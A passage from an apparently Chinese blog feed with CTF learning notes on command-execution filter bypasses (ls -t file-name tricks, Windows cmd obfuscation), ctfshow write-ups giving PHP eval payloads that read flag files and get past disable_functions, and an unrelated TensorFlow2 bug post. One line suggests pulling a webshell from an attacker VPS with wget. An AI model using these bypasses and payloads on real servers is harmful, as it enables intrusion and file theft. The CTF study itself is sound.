<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~# <span class="title">echo</span> &quot;<span class="title">ca</span>\\&quot;&gt;<span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">echo</span> &quot;<span class="title">t</span>\\&quot;&gt;&gt;<span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">echo</span> &quot; <span class="title">fl</span>\\&quot;&gt;&gt;<span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">echo</span> &quot;<span class="title">ag</span>&quot;&gt;&gt;<span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">cat</span> <span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">ca</span>\</span></span><br><span class="line"><span class="function"><span class="title">t</span>\</span></span><br><span class="line"><span class="function"> <span class="title">fl</span>\</span></span><br><span class="line"><span class="function"><span class="title">ag</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~# <span class="title">sh</span> <span class="title">cmd</span></span></span><br><span class="line"><span class="function"><span class="title">this</span> <span class="title">is</span> <span class="title">your</span> <span class="title">flag</span></span></span><br></pre></td></tr></table></figure>
<p>用这种方法可以绕过一些长度限制读取文件内容</p>
<h3 id="利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过"><a href="#利用ls-t和-gt-以及换行符绕过长度限制执行命令-文件构造绕过" class="headerlink" title="利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)"></a>利用ls -t和&gt;以及换行符绕过长度限制执行命令(文件构造绕过)</h3><p>在<code>linux</code>中，我们使用<code>ls -t</code>命令后，可以将文件名按照时间顺序排列出来（后创建的排在前面）</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~/<span class="title">example</span># <span class="title">touch</span> <span class="title">a</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">touch</span> <span class="title">b</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">touch</span> <span class="title">c</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">ls</span> -<span class="title">t</span></span></span><br><span class="line"><span class="function"><span class="title">c</span>  <span class="title">b</span>  <span class="title">a</span></span></span><br></pre></td></tr></table></figure>
<p>我们来看看<code>ls -t&gt;ghtwf01</code>有什么效果(开始不存在<code>ghtwf01</code>这个文件)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~/<span class="title">example</span># <span class="title">ls</span> -<span class="title">t</span>&gt;<span class="title">ghtwf01</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">cat</span> <span class="title">ghtwf01</span> </span></span><br><span class="line"><span class="function"><span class="title">ghtwf01</span></span></span><br><span class="line"><span class="function"><span class="title">c</span></span></span><br><span class="line"><span class="function"><span class="title">b</span></span></span><br><span class="line"><span class="function"><span class="title">a</span></span></span><br></pre></td></tr></table></figure>
<p>这条命令先执行了创建<code>ghtwf01</code>文件然后将<code>ls -t</code>的执行结果写入<code>ghtwf01</code>文件<br>我们试试用这些方法来执行命令<code>cat flag</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">root@kali:~/<span class="title">example</span># &gt; &quot;<span class="title">ag</span>&quot;</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># &gt; &quot;<span class="title">fl</span>\\&quot;</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># &gt; &quot;<span class="title">t</span> \\&quot;</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># &gt; &quot;<span class="title">ca</span>\\&quot;</span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">ls</span> -<span class="title">t</span></span></span><br><span class="line"><span class="function">&#x27;<span class="title">ca</span>\&#x27;  &#x27;<span class="title">t</span> \&#x27;  &#x27;<span class="title">fl</span>\&#x27;   <span class="title">ag</span>   <span class="title">flag</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">ls</span> -<span class="title">t</span> &gt; <span class="title">a</span></span></span><br><span class="line"><span class="function"><span class="title">root</span>@<span class="title">kali</span>:~/<span class="title">example</span># <span class="title">sh</span> <span class="title">a</span></span></span><br><span class="line"><span class="function"><span class="title">a</span>: 1: <span class="title">a</span>: <span class="title">not</span> <span class="title">found</span></span></span><br><span class="line"><span class="function"><span class="title">this</span> <span class="title">is</span> <span class="title">your</span> <span class="title">flag</span></span></span><br><span class="line"><span class="function"><span class="title">a</span>: 6: <span class="title">flag</span>: <span class="title">not</span> <span class="title">found</span></span></span><br></pre></td></tr></table></figure>
<p>读取到了<code>flag</code>内容为<code>this is your flag</code>，无论这个文件里面有不有其它内容都能执行<br>总而言之文件构造绕过就是如下知识：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">linux下可以用 <span class="number">1</span>&gt;a创建文件名为a的空文件</span><br><span class="line">ls -t&gt;test则会将目录按时间排序后写进test文件中</span><br><span class="line">sh命令可以从一个文件中读取命令来执行</span><br></pre></td></tr></table></figure>
<p>反弹<code>shell</code>命令比较长就可以用这种方式去绕过长度限制<br>如果服务器能连外网还可以使用命令<code>wget 网址 -O shell.php</code>去执行我们自己<code>vps</code>上面的木马文件</p>
<h3 id="无字母数字绕过"><a href="#无字母数字绕过" class="headerlink" title="无字母数字绕过"></a>无字母数字绕过</h3><p>我学了，啥都看不懂，有什么好说的。</p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/109143413?spm=1001.2014.3001.5501">羽师傅博客：无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神博客：无字母数字webshell之提高篇</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神博客：一些不包含数字和字母的webshell</a></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">Firebasky博客：无字母数字的命令执行(ctfshow web入门 55）</a></p>
<h2 id="Windows绕过姿势"><a href="#Windows绕过姿势" class="headerlink" title="Windows绕过姿势"></a>Windows绕过姿势</h2><h3 id="符号与命令"><a href="#符号与命令" class="headerlink" title="符号与命令"></a>符号与命令</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami &#x2F;&#x2F;正常执行</span><br><span class="line">w&quot;h&quot;o&quot;a&quot;m&quot;i 或&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i&quot;或&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i或w&quot;h&quot;o&quot;a&quot;m&quot;i&quot;&#x2F;&#x2F;正常执行</span><br><span class="line">who^ami或wh&quot;&quot;o^a^mi 或wh&quot;&quot;o^a^mi&quot;&#x2F;&#x2F;正常执行</span><br><span class="line">但是&quot;wh&quot;&quot;o^a^mi&quot;这种在开头就有单引号的情况是不能执行的</span><br><span class="line">(Whoami)或(Wh^o^am&quot;&quot;i)或((((Wh^o^am&quot;&quot;i)))) &#x2F;&#x2F;正常执行  注:可以加无数个&quot;但不能同时连续加2个^符号，因为^号是cmd中的转义符，跟在他后面的符号会被转义</span><br></pre></td></tr></table></figure>
<h3 id="管道符-1"><a href="#管道符-1" class="headerlink" title="管道符"></a>管道符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">|        &#x2F;&#x2F;直接执行后面的语句</span><br><span class="line">||       &#x2F;&#x2F;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&amp;        &#x2F;&#x2F;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&amp;&amp;       &#x2F;&#x2F;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
<h3 id="set命令"><a href="#set命令" class="headerlink" title="set命令"></a>set命令</h3><p><em>知识点:用两个%括起来的变量,会输出变量的值</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;1     &#x2F;&#x2F;设置变量a，值为1</span><br><span class="line">echo a      &#x2F;&#x2F;此时输出结果为&quot;a&quot;</span><br><span class="line">echo %a%    &#x2F;&#x2F;此时输出结果为&quot;1&quot;</span><br></pre></td></tr></table></figure>
<p>接下来的进阶利用就是:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;who</span><br><span class="line">set b&#x3D;ami</span><br><span class="line">%a%%b% &#x2F;&#x2F;正常执行whoami</span><br><span class="line">call %a%%b% &#x2F;&#x2F;正常执行whoami</span><br></pre></td></tr></table></figure>
<p>所以,上述的符号与命令部分的所有操作,都可以通过set来实现,只需要慢慢拼接就ok</p>
<h3 id="切割字符："><a href="#切割字符：" class="headerlink" title="切割字符："></a>切割字符：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;whoami</span><br><span class="line">%a:~0%     &#x2F;&#x2F;取出所有字符,所以正常执行命令</span><br><span class="line">%a:~0,6%   &#x2F;&#x2F;从开始切割6个字符,刚好是whoami,所以正常执行</span><br><span class="line">%a:~0,5%   &#x2F;&#x2F;切割后是whoam,不是系统命令,不能执行</span><br></pre></td></tr></table></figure>
<p>注:上述可以使用减号,和python的切割效果差不多</p>
<p>所以,可以考虑的东西就来了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set a&#x3D;abc qwe     &#x2F;&#x2F;先自定义</span><br><span class="line">wh^o^%a:~0,1%mi   &#x2F;&#x2F;然后截断整理后就变成了:wh^o^ami,所以命令执行成功</span><br></pre></td></tr></table></figure>
<p>可以简单地写出webshell</p>
<h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="http://blog.leanote.com/post/bowu/de8babf67fd8">Bowu博客：CTF之命令执行绕过总结</a></p>
<p><a href="https://www.cnblogs.com/NPFS/p/13279815.html">NPFS博客：命令执行绕过小技巧</a></p>
<p><a href="https://www.ghtwf01.cn/index.php/archives/273/">ghtwf01博客：命令执行漏洞利用及绕过方式总结</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/109143413?spm=1001.2014.3001.5501">羽师傅博客：无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本）</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神博客：无字母数字webshell之提高篇</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">P神博客：一些不包含数字和字母的webshell</a></p>
<p><a href="https://blog.csdn.net/qq_46091464/article/details/108513145">Firebasky博客：无字母数字的命令执行(ctfshow web入门 55）</a></p>
<p>还有文中直接引用的博客部分。</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow命令执行绕过disable_functions</title>
    <url>/2021/04/19/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87disable_functions/</url>
    <content><![CDATA[<h1 id="ctfshow命令执行绕过disable-functions"><a href="#ctfshow命令执行绕过disable-functions" class="headerlink" title="ctfshow命令执行绕过disable_functions"></a>ctfshow命令执行绕过disable_functions</h1><p>船新版本，绕过禁用函数。</p>
<span id="more"></span>
<h2 id="web58-65"><a href="#web58-65" class="headerlink" title="web58-65"></a>web58-65</h2><h3 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><p>绕过disable_function，那我们先看一下phpinfo() ，然后发现被禁了？？？<del>那还绕什么，关闭浏览器</del></p>
<p>整理一下payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;高亮显示php文件</span><br><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br><span class="line">c&#x3D;highlight_file(&quot;flag.php&quot;);</span><br><span class="line">&#x2F;&#x2F;通过复制，重命名读取php文件内容（函数执行后，访问url&#x2F;flag.txt）</span><br><span class="line">copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);          </span><br><span class="line">rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);        </span><br><span class="line">&#x2F;&#x2F;单一函数读文件内容：</span><br><span class="line">echo file_get_contents(&quot;flag.php&quot;);   </span><br><span class="line">readfile(&quot;flag.php&quot;);                      </span><br><span class="line">print_r(file(&quot;flag.php&quot;)); </span><br><span class="line">&#x2F;&#x2F;文件包含绕过：</span><br><span class="line">post:c&#x3D;include($_GET[1]);</span><br><span class="line">get:?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
<p>再贴出羽师傅的一些其他操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过fopen读文件内容：</span><br><span class="line">函数：</span><br><span class="line">fread()</span><br><span class="line">fgets()</span><br><span class="line">fgetc()</span><br><span class="line">fgetss()</span><br><span class="line">fgetcsv()</span><br><span class="line">gpassthru()</span><br><span class="line">用法：</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetss($a);echo $line;&#125;       &#x2F;&#x2F;php7.3版本后 该函数已不再被使用</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fpassthru($a);                                      &#x2F;&#x2F;过59</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);echo fread($a,&quot;1000&quot;);                                   &#x2F;&#x2F;过59</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgets($a);echo $line;&#125;        &#x2F;&#x2F;过59</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetc($a);echo $line;&#125;        &#x2F;&#x2F;过60</span><br><span class="line">$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetcsv($a);print_r($line);&#125;  &#x2F;&#x2F;过60</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag不在flag.php中,需要先查找flag所在的位置</span><br><span class="line">scandir()</span><br><span class="line">opendir()</span><br><span class="line">用法</span><br><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));highlight_file(&quot;&#x2F;flag.txt&quot;);                                                           &#x2F;&#x2F;过66-67</span><br><span class="line">c&#x3D;$a&#x3D;opendir(&quot;&#x2F;&quot;); while (($file &#x3D; readdir($a)) !&#x3D;&#x3D; false)&#123;echo $file . &quot;&lt;br&gt;&quot;; &#125;;highlight_file(&quot;&#x2F;flag.txt&quot;);  &#x2F;&#x2F;过66-67</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">后面因为是txt文件，所以直接用include直接包含就能显示flag</span><br><span class="line">include()</span><br><span class="line">require()</span><br><span class="line">用法：</span><br><span class="line">include(&quot;&#x2F;flag.txt&quot;);  &#x2F;&#x2F;过66-70</span><br><span class="line">require(&quot;&#x2F;flag.txt&quot;);  &#x2F;&#x2F;过66-70</span><br></pre></td></tr></table></figure>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><blockquote>
<p><a href="https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501">https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501</a></p>
</blockquote>
<h2 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h2><h3 id="1、题目："><a href="#1、题目：" class="headerlink" title="1、题目："></a>1、题目：</h3><p>同上。</p>
<h3 id="2、解答："><a href="#2、解答：" class="headerlink" title="2、解答："></a>2、解答：</h3><p>没变，但是flag不在当前文件夹下了。需要扫目录：</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;var_dump(scandir(&quot;&#x2F;&quot;));</span><br><span class="line">c&#x3D;print_r(scandir(&quot;&#x2F;&quot;));</span><br></pre></td></tr></table></figure>
<p>扫出目录后highlight_file()即可</p>
<h2 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h2><h3 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h3><p>ban了highlight_file()</p>
<h3 id="解答：-1"><a href="#解答：-1" class="headerlink" title="解答："></a>解答：</h3><p>试试include(‘/flag.php’) 发现太大出不来。考虑到flag应该在根目录下的flag.txt里，于是直接用包含做。</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;include(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;require(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;require_once(&#39;&#x2F;flag.txt&#39;);</span><br><span class="line">c&#x3D;include_once(&#39;&#x2F;flag.txt&#39;);</span><br></pre></td></tr></table></figure>
<p>扩展：扫目录函数被ban完了。记录下Y4的扫目录操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br></pre></td></tr></table></figure>
<h2 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h2><h3 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="解答：-2"><a href="#解答：-2" class="headerlink" title="解答："></a>解答：</h3><p>ob_get_contents — 返回输出缓冲区的内容<br>ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲</p>
<p>官方介绍：</p>
<blockquote>
<p>此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃。</p>
</blockquote>
<p>利用exit，停止后面的程序</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;require(&quot;&#x2F;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure>
<h2 id="web72（不会）"><a href="#web72（不会）" class="headerlink" title="web72（不会）"></a>web72（不会）</h2><p>不会，之后学</p>
<h2 id="web73、74"><a href="#web73、74" class="headerlink" title="web73、74"></a>web73、74</h2><p>文件不再是flag.txt了，需要自己扫，但是扫的东西ban了一大半。</p>
<h3 id="解答：-3"><a href="#解答：-3" class="headerlink" title="解答："></a>解答：</h3><p>通过glob遍历目录：</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;?&gt;&lt;?php</span><br><span class="line">	$a&#x3D;new DirectoryIterator(&quot;glob:&#x2F;&#x2F;&#x2F;*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#39; &#39;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>扫出来一回正常文件包含梭了。</p>
<p>能做的题都在这了，之后会总结一下命令执行的操作和姿势。</p>
<h2 id="参考链接：-1"><a href="#参考链接：-1" class="headerlink" title="参考链接："></a>参考链接：</h2><blockquote>
<p><a href="https://www.cnblogs.com/NPFS/p/13797436.html">https://www.cnblogs.com/NPFS/p/13797436.html</a></p>
<p><a href="https://blog.csdn.net/solitudi/article/details/109837640?spm=1001.2014.3001.5501">https://blog.csdn.net/solitudi/article/details/109837640?spm=1001.2014.3001.5501</a></p>
<p><a href="https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501">https://blog.csdn.net/miuzzx/article/details/108619930?spm=1001.2014.3001.5501</a></p>
</blockquote>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>运用tensorflow2在人脸识别中遇到的问题和bug</title>
    <url>/2021/04/17/%E8%BF%90%E7%94%A8tensorflow2%E5%9C%A8%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%92%8Cbug/</url>
    <content><![CDATA[<h1 id="运用tensorflow2在人脸识别中遇到的问题和bug"><a href="#运用tensorflow2在人脸识别中遇到的问题和bug" class="headerlink" title="运用tensorflow2在人脸识别中遇到的问题和bug"></a>运用tensorflow2在人脸识别中遇到的问题和bug</h1><p>之前做科创项目时遇到的一些问题的解决方案，特此记录。</p>
<span id="more"></span>
<h2 id="bug1：TensorFlow2与TensorFlow1不兼容的问题。"><a href="#bug1：TensorFlow2与TensorFlow1不兼容的问题。" class="headerlink" title="bug1：TensorFlow2与TensorFlow1不兼容的问题。"></a>bug1：TensorFlow2与TensorFlow1不兼容的问题。</h2><p>这是目前最为常见的问题，由于卷积神经网络最火的时间在18年，当时产出了大量优质的项目和开源代码供使用。但如果今日想要复现当时的成果时，会遭遇TensorFlow和python版本更新后不兼容的问题。</p>
<p>推测当时版本：TensorFlow1，python3.6</p>
<p>根据网上报错的解答，可以得知TensorFlow1.13版本不兼容python3.7环境，偌使用python3.7环境，建议将TensorFlow更新至1.15。</p>
<p>本机环境采用的TensorFlow2.0版本</p>
<h3 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h3><p>既然问题已经非常明显了，当遇到报错提示为(此类型通用)</p>
<p><code>AttributeError: module &#39;tensorflow&#39; has no attribute</code></p>
<p>意味着TensorFlow2中不再有改模块。</p>
<h5 id="给出两种解决方案："><a href="#给出两种解决方案：" class="headerlink" title="给出两种解决方案："></a>给出两种解决方案：</h5><p>1、卸载当前版本TensorFlow，回到源代码版本的TensorFlow</p>
<p>2、将以下代码进行修改：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br></pre></td></tr></table></figure>
<p>改为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow.compat.v1 <span class="keyword">as</span> tf</span><br><span class="line">tf.disable_v2_behavior()</span><br></pre></td></tr></table></figure>
<p>此法可以解决90%的报错。但是有一个例外，也就是<u><strong>contrib</strong></u>模块。</p>
<p>此模块的解决方案：建议回TensorFlow1+python3.6，或者根据官方文档及上述引用链接自行修改。</p>
<p><strong>4月20日更新：</strong></p>
<p>contrib模块中的slim已经没了，如果需要调用slim模块，需要</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install tf_slim</span><br></pre></td></tr></table></figure>
<p>将配置文件中的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">slim = tf.contrib.slim()</span><br></pre></td></tr></table></figure>
<p>全部改为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">slim = tf_slim()</span><br></pre></td></tr></table></figure>
<p>且加上关闭TensorFlow2功能的相关语句。</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><blockquote>
<p><a href="https://blog.csdn.net/kyle1314608/article/details/100594884">https://blog.csdn.net/kyle1314608/article/details/100594884</a></p>
</blockquote>
<h2 id="bug2-cv2-imread-读取图片返回none。"><a href="#bug2-cv2-imread-读取图片返回none。" class="headerlink" title="bug2:cv2.imread()读取图片返回none。"></a>bug2:cv2.imread()读取图片返回none。</h2><p>读取图片返回空，会直接导致后期图片处理出问题，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cv2.error: OpenCV(3.4.3) C:\projects\opencv-python\opencv\modules\imgproc\src\resize.cpp:4044: error: (-215:Assertion failed) !ssize.empty() in function &#39;cv::resize’</span><br></pre></td></tr></table></figure>
<h3 id="解决方案：-1"><a href="#解决方案：-1" class="headerlink" title="解决方案："></a>解决方案：</h3><h4 id="原因1：图片路径形式书写错误"><a href="#原因1：图片路径形式书写错误" class="headerlink" title="原因1：图片路径形式书写错误"></a>原因1：图片路径形式书写错误</h4><p>\在程序中为转义符号，不可用错</p>
<p>OpenCV读取路径单路径即可，不需要 // </p>
<p>错误的形式：C:\Users\Desktop\test<br>正确的应该：C:/Users/Desktop/test/</p>
<h4 id="原因2：图片路径没有写全"><a href="#原因2：图片路径没有写全" class="headerlink" title="原因2：图片路径没有写全"></a>原因2：图片路径没有写全</h4><p>具体图片精确到 .jpg/.png</p>
<p>具体文件夹精确到：test/</p>
<p>正确的应该：C:/Users/Desktop/test/</p>
<h4 id="原因3：路径中带中文"><a href="#原因3：路径中带中文" class="headerlink" title="原因3：路径中带中文"></a>原因3：路径中带中文</h4><p>路径中绝对绝对绝对绝对绝对绝对不要有任何<strong><em><u>中文</u></em></strong>！！！特别是python3环境下</p>
<h4 id="原因4：图片数量不一致"><a href="#原因4：图片数量不一致" class="headerlink" title="原因4：图片数量不一致"></a>原因4：图片数量不一致</h4><p>你有多少图片，就搞多少图片，别自己变图片出来。</p>
<p>主要在循环遍历时才会遇到这个问题</p>
<h3 id="参考链接：-1"><a href="#参考链接：-1" class="headerlink" title="参考链接："></a>参考链接：</h3><blockquote>
<p><a href="https://blog.csdn.net/m0_37882192/article/details/108738901">https://blog.csdn.net/m0_37882192/article/details/108738901</a></p>
</blockquote>
<h2 id="bug3-checkpoint文件内部设置。"><a href="#bug3-checkpoint文件内部设置。" class="headerlink" title="bug3:checkpoint文件内部设置。"></a>bug3:checkpoint文件内部设置。</h2><p>以我的为参考：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">G:&#x2F;science&#x2F;trainmodel&#x2F;model-600</span><br></pre></td></tr></table></figure>
<p>注意 ‘ / ‘ 以及模型不带后缀。</p>
<p>另外，训练时生成模型使用的函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">saver.save(sess, <span class="string">&#x27;G:/science/trainmodel/model&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>中的路径部分采用windows格式的 ‘ / ‘即可，我之前写python路径写顺手了，直接写了全部 // ，直接GG</p>
<h2 id="bug4-saver-restore恢复模型报错"><a href="#bug4-saver-restore恢复模型报错" class="headerlink" title="bug4:saver.restore恢复模型报错"></a>bug4:saver.restore恢复模型报错</h2><p>经典坑位之一，附上我的代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">saver.restore(sess, tf.train.latest_checkpoint(<span class="string">&#x27;G:/science/trainmodel&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>tf.train一行指调用生成的最后一个模型，还有多种参数可以按需使用。</p>
<p>路径单双斜杠均不受影响。</p>
]]></content>
      <categories>
        <category>科创</category>
      </categories>
      <tags>
        <tag>Tensorflow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow命令执行51-57</title>
    <url>/2021/04/14/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C51-57/</url>
    <content><![CDATA[<h1 id="ctfshow命令执行51-57"><a href="#ctfshow命令执行51-57" class="headerlink" title="ctfshow命令执行51-57"></a>ctfshow命令执行51-57</h1><p>ctfshow中web入门命令执行篇的一些刷题笔记</p>
